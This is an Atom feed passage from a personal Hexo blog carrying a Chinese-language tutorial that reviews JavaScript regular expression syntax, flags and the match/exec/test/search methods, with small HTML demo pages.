<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Poetry&#39;s Blog</title>
  
  <subtitle>Choose a gesture to allow yourself to live irreplaceable.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.poetries.top/"/>
  <updated>2018-04-10T03:33:13.987Z</updated>
  <id>http://blog.poetries.top/</id>
  
  <author>
    <name>Poetry</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>正则回顾总结</title>
    <link href="http://blog.poetries.top/2018/04/10/js-reg-review/"/>
    <id>http://blog.poetries.top/2018/04/10/js-reg-review/</id>
    <published>2018-04-10T02:09:43.000Z</published>
    <updated>2018-04-10T03:33:13.987Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><h3 id="1-1-正则表达式的web常见场合"><a href="#1-1-正则表达式的web常见场合" class="headerlink" title="1.1 正则表达式的web常见场合"></a>1.1 正则表达式的web常见场合</h3><ul><li>邮箱验证</li><li>用户名验证</li><li>替换字符串某一部分</li><li>信息采集 用来分析有效的代码段</li></ul><h3 id="1-2-字符串应用正则"><a href="#1-2-字符串应用正则" class="headerlink" title="1.2 字符串应用正则"></a>1.2 字符串应用正则</h3><ul><li><code>string.match(reg)</code>正则查找字符串 </li><li><code>string.search(reg)</code> 正则查找位置</li><li><code>string.replace(reg,&#39;newstr&#39;)</code>正则替换</li><li><code>string.split（reg）</code>正则拆分</li></ul><h3 id="1-3-正则表达式3句话"><a href="#1-3-正则表达式3句话" class="headerlink" title="1.3 正则表达式3句话"></a>1.3 正则表达式3句话</h3><h4 id="1-3-1-要找什么字符？（5中方法）"><a href="#1-3-1-要找什么字符？（5中方法）" class="headerlink" title="1.3.1 要找什么字符？（5中方法）"></a>1.3.1 要找什么字符？（5中方法）</h4><ul><li>字面值 比如：<code>hi</code>就是找<code>hi</code></li><li>字符的集合<code>[abcd]</code>匹配<code>abdc</code>任意一个</li><li>用范围来表示字符<code>[0-9] [a-z][A-Z]</code></li><li>字符簇 就是系统为常用的字符集合创建的一个简写<ul><li>例如：<code>\d</code> 表示<code>[0-9]</code> <code>\w</code>代表<code>[0-9a-zA-Z_]</code>  <code>\s</code>代表<code>[\t\v\f\r\n]</code>（空白符）</li></ul></li><li>补集的形式来表示字符集合<ul><li>例如：<code>[0-9]</code> 补集 <code>[^0-9]</code></li><li>对于字符簇只需把字母大写即可表示补集 <code>\d</code> –&gt;<code>\D</code>（非数字）  <code>\w</code>–&gt;<code>\W</code> （代表<code>a-z0-9A-Z</code>之外的东西） <code>\s</code> –&gt;<code>\S</code>(代表非空白字符)</li></ul></li><li>点代表 任意字符 (不包括换行符)</li></ul><h4 id="1-3-2-从哪里找-找到哪？"><a href="#1-3-2-从哪里找-找到哪？" class="headerlink" title="1.3.2 从哪里找,找到哪？"></a>1.3.2 从哪里找,找到哪？</h4><ul><li><code>\b</code>单词边界  <code>\bhi</code>从单词边界开始匹配<code>hi</code></li><li><code>\B</code> 单词的非边界 把单词的中间某一部分取出来  把中间含有hi的单词取出来 即<code>hi</code>不能再两端</li><li><code>^</code> 从字符串的起始位置开始匹配</li><li><code>$</code>匹配到字符串的额结束位置</li></ul><h4 id="1-3-3-找多少"><a href="#1-3-3-找多少" class="headerlink" title="1.3.3 找多少"></a>1.3.3 找多少</h4><ul><li><code>*</code>表示匹配<code>0-</code>无穷<code>==</code>等价<code>(0,)</code></li><li><code>+</code>表示匹配<code>1-</code>无穷 <code>==</code>等价<code>(1,)</code></li><li><code>?</code>表示<code>[0,1] ==</code> 等价<code>(0,1)</code></li><li><code>a(n)</code>: 字符a准确出<code>现n</code>次</li><li><code>a(n,)</code>:字符<code>a</code>至少出现<code>n</code>次</li><li><code>a(n,m):n</code>到<code>m</code>次</li></ul><h3 id="1-3-贪婪模式"><a href="#1-3-贪婪模式" class="headerlink" title="1.3 贪婪模式"></a>1.3 贪婪模式</h3><ul><li>个数修饰符默认是贪婪模式 尽量多找</li><li>是指在上面的个数修饰符后面加<code>?</code>，则为非贪婪模式，尽量少的找</li></ul><p><strong>模式</strong>：</p><ul><li>以匹配为例默认情况 match找到一次就结束 能否告诉匹配过程 一直找 在全文范围内一直找</li><li><code>g</code> 表示全局模式 global  找所有的  而不是就找一行就结束</li><li><code>i</code> ignore 忽略大小写</li><li><code>s</code> 单行模式（把整篇文章看成一行）js不支持单行模式</li><li><code>m</code> 多行模式</li></ul><h2 id="二、语法"><a href="#二、语法" class="headerlink" title="二、语法"></a>二、语法</h2><h3 id="2-1-基本元字符"><a href="#2-1-基本元字符" class="headerlink" title="2.1 基本元字符"></a>2.1 基本元字符</h3><ul><li><code>.</code> ： 匹配除了换行符之外的任何单个字符</li><li><code>\</code> ： 在非特殊字符之前的反斜杠表示下一个字符是特殊的</li><li><code>|</code>： 逻辑或操作符</li><li><code>[]</code> ：定义一个字符集合，匹配字符集合中的一个字符，在字符集合里面像 <code>.</code>，\这些字符都表示其本身</li><li><code>[^]</code>：对上面一个集合取非</li><li><code>-</code>：定义一个区间，例如<code>[A-Z]</code>，其首尾字符在 <code>ASCII</code> 字符集里面</li></ul><h3 id="2-2-数量元字符"><a href="#2-2-数量元字符" class="headerlink" title="2.2 数量元字符"></a>2.2 数量元字符</h3><ul><li><code>{m,n}</code> ：匹配前面一个字符至少 <code>m</code> 次至多 <code>n</code> 次重复，还有<code>{m}</code>表示匹配 <code>m</code> 次，<code>{m,}</code>表示至少 <code>m</code> 次</li><li><code>+</code> ： 匹配前面一个表达式一次或者多次，相当于<code>{1,}</code>，记忆方式追加<code>(+)</code>，起码得有一次</li><li><code>*</code> ： 匹配前面一个表达式零次或者多次，相当于<code>{0,}</code>，记忆方式乘法<code>(*)</code>，可以一次都没有</li><li><code>?</code> ： 单独使用匹配前面一个表达式零次或者一次，相当于 <code>{0,1}</code></li></ul><h3 id="2-3-位置元字符"><a href="#2-3-位置元字符" class="headerlink" title="2.3 位置元字符"></a>2.3 位置元字符</h3><ul><li><code>^</code> ： 单独使用匹配表达式的开始</li><li><code>\$</code>： 匹配表达式的结束</li><li><code>\b</code>：匹配单词边界</li><li><code>\B</code>：匹配非单词边界</li><li><code>(?=p)</code>：匹配 <code>p</code> 前面的位置</li><li><code>(?!p)</code>：匹配不是 <code>p</code> 前面的位置</li></ul><h3 id="2-4-特殊元字符"><a href="#2-4-特殊元字符" class="headerlink" title="2.4 特殊元字符"></a>2.4 特殊元字符</h3><ul><li><code>\d</code>：<code>[0-9]</code>，表示一位数字，记忆方式 digit</li><li><code>\D</code>：<code>[^0-9]</code>，表示一位非数字</li><li><code>\s</code>：<code>[\t\v\n\r\f]</code>，表示空白符，包括空格，水平制表符（\t），垂直制表符（\v），换行符（\n），回车符（\r），换页符（\f），记忆方式 space character</li><li><code>\S</code>：<code>[^\t\v\n\r\f]</code>，表示非空白符</li><li><code>\w</code>：<code>[0-9a-zA-Z]</code>，表示数字大小写字母和下划线，记忆方式 word</li><li><code>\W</code>：<code>[^0-9a-zA-Z]</code>，表示非单词字符</li></ul><h3 id="2-5-标志字符"><a href="#2-5-标志字符" class="headerlink" title="2.5 标志字符"></a>2.5 标志字符</h3><ul><li><code>g</code> : 全局搜索 记忆方式global</li><li><code>i</code> ：不区分大小写 记忆方式 ignore</li><li><code>m</code> ：多行搜索</li></ul><h2 id="三、match，test，exec，search的返回值"><a href="#三、match，test，exec，search的返回值" class="headerlink" title="三、match，test，exec，search的返回值"></a>三、match，test，exec，search的返回值</h2><h3 id="3-1-match的用法"><a href="#3-1-match的用法" class="headerlink" title="3.1 match的用法"></a>3.1 match的用法</h3><p><strong>在不加全局“g”的情况下</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="regexp">/o/</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回的结果是：["o", index: 1, input: "wo shi zhong guo ren"]；</span></span><br></pre></td></tr></table></figure><p><strong>在加全局“g”的情况下</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="regexp">/o/g</span>));</span><br><span class="line"></span><br><span class="line">返回的结果是：[<span class="string">"o"</span>, <span class="string">"o"</span>, <span class="string">"o"</span>]；</span><br></pre></td></tr></table></figure><h3 id="3-2-exec的用法"><a href="#3-2-exec的用法" class="headerlink" title="3.2 exec的用法"></a>3.2 exec的用法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> re=<span class="regexp">/o/</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(re.exec(str));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回的结果是：["o", index: 1, input: "wo shi zhong guo ren"]；</span></span><br><span class="line"><span class="comment">// exec返回的和match不加全局“g”’一样</span></span><br></pre></td></tr></table></figure><h3 id="3-3-test的用法"><a href="#3-3-test的用法" class="headerlink" title="3.3 test的用法"></a>3.3 test的用法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> re=<span class="regexp">/o/</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(re.test(str));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回的结果是：true（如果找不到返回的则是false）</span></span><br></pre></td></tr></table></figure><h3 id="3-4-search的用法"><a href="#3-4-search的用法" class="headerlink" title="3.4 search的用法"></a>3.4 search的用法</h3><ul><li>关于search用法其实很简单，它和indexOf是一样的，就是找到index，而且是从前往后数的。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"wo shi zhong guo ren"</span>;</span><br><span class="line"><span class="keyword">var</span> re=<span class="regexp">/o/</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(str.search(re));</span><br><span class="line"></span><br><span class="line">返回的结果是：<span class="number">1</span>；</span><br></pre></td></tr></table></figure><h2 id="四、应用"><a href="#四、应用" class="headerlink" title="四、应用"></a>四、应用</h2><h3 id="4-1-例1"><a href="#4-1-例1" class="headerlink" title="4.1 例1"></a>4.1 例1</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/xWMRxR" target="_blank" rel="noopener">https://codepen.io/poetries/pen/xWMRxR</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>正则-例子1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"正匹配单词hi"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi开头的单词但不是hi"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/hi/</span>;<span class="comment">//仅仅是看字符串中有没有hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">//满足 返回true  不满足 返回false</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bhi\b/</span>;<span class="comment">//正则测试单词hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">//满足 返回true  不满足 返回false</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bhi\b/</span>;<span class="comment">//正则测试hi开头的单词但不是hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">//满足 返回true  不满足 返回false</span></span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-2-例2-要找什么字符串"><a href="#4-2-例2-要找什么字符串" class="headerlink" title="4.2 例2-要找什么字符串"></a>4.2 例2-要找什么字符串</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/oqmYNw" target="_blank" rel="noopener">https://codepen.io/poetries/pen/oqmYNw</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>要找什么字符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    textarea&#123;</span></span><br><span class="line"><span class="undefined">    width: 400px;</span></span><br><span class="line"><span class="undefined">    height: 200px; </span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"找不好的数字"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"有没有数字"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"有没有大写字母"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"是否全为数字"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/[347]/</span>;<span class="comment">// 匹配347任意一个字符的集合[abcd] 匹配abdc任意一个</span></span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//var reg = /[0123456789]/;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//var reg = /[0-9]/;// 匹配有没有数字</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\d/</span>;<span class="comment">// \d 表示[0-9]</span></span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/[A-Z]/</span>;<span class="comment">// 匹配有没有数字</span></span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/[^0-9]/</span>;<span class="comment">// 匹配非数字 0-9之外的字符  对于网上发布手机号之类的很有用 比如1300 把00换成OO 就没法认出</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(reg.test(cv))&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">'有非数字存在'</span>);</span></span><br><span class="line"><span class="javascript">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">'全是数字'</span>);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-3-例3-从哪里开始匹配"><a href="#4-3-例3-从哪里开始匹配" class="headerlink" title="4.3 例3-从哪里开始匹配"></a>4.3 例3-从哪里开始匹配</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/jzdVOo" target="_blank" rel="noopener">https://codepen.io/poetries/pen/jzdVOo</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>74-从哪里开始匹配<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi开头及hi开头的单词"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配hi开头的单词但不是hi"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配进行时的单词"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span 